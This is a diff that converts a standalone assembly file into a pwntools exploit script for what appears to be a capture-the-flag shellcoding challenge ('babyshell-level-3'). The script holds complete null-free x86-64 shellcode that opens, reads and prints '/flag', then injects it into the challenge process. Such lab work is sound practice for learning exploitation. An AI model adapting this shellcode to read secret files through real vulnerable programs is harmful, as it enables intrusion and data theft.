@@ -1,21 +1,21 @@
-.global _start
-_start:
-.intel_syntax noprefix
+from pwn import *
 
-        # open
+p = process('/challenge/babyshell-level-3', aslr=False)
+context.update(arch="amd64")
+
+shellcode = asm('''
         xor rsi, rsi
         xor rax, rax
         push rax
-        mov rbx, 0x67616c66
+        mov rbx, 0x67616c66 #flag
         shl rbx, 8
-        mov bl, 0x2f
+        mov bl, 0x2f #/
         push rbx
 
         mov rdi, rsp
         mov al, 2
         syscall
 
-        # read
         mov rdi, rax
         mov rsi, rsp
         xor rdx, rdx
@@ -23,7 +23,6 @@ _start:
         xor rax, rax
         syscall
 
-        # write
         xor rdi, rdi
         mov dil, 1
         mov rsi, rsp
@@ -32,9 +31,12 @@ _start:
         inc rax
         syscall
 
-        # exit
         xor rax,rax
         mov al, 60
         xor rdi, rdi
         mov dil, 42
         syscall
+''')
+
+p.send(shellcode)
+p.interactive()
